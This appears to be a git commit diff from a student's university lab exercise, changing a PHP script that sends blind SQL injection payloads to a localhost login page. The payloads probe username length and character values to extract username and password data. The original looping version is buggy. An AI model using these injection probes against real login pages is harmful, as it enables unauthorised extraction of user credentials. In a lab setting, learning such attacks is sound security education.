c63aa724d84994017665c6508b3107b8a947cf7b
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 13:30:54 +0200

    test

--- script.php
+++ script.php
@@ -3,34 +3,29 @@
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"
 
-$i = 3;
-$counter = 0;
-while ($count<25)
+$i = 5;
+
+$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
+/*$counter = 0;
+while ($counter < 25)
 {
-    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
-	
-    print($count);
-    $result = file_get_contents($url);
-
-	//print($result);
+    
+}*/
 
 
-	if (strpos($result, 'cat') !== false) {
-		echo "\n";
-		echo 'true';
-		echo "\n";
-		echo "size $counter";
-		break;
-	}else{
-		$count++;
-		echo "\n";
-		echo "nope";
-	}
+
+$result = file_get_contents($url);
+
+print($result);
+
+
+if (strpos($result, 'cat') !== false) {
+	echo "\n";
+	echo 'true';
+}else{
+	echo "\n";
+	echo "nope";
 }
-
-
-
-
 
 echo "\n";
 
